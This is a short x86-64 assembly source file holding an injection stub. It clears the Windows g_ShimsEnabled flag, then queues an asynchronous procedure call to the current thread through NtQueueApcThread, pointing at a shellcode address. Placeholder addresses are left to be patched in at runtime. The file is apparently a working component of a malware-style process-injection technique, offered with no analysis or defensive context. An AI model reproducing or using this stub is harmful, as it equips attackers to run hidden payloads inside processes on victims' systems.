.intel_syntax noprefix


.section .data
    .global stub

stub:
    mov rcx, 0x111111111111             # placeholder for g_ShimsEnabled
    mov byte ptr [rcx], 0               # turn off switch  

    xor rcx, rcx
    dec rcx
    dec rcx                             # arg 1 ThreadHandle
             
    mov rdx, 0x222222222222             # placeholder for arg 2 ApcRoutine (ptr to shellcode)
    mov rax, 0x333333333333             # placeholder for NtQueueApcThread
    call rax
    ret
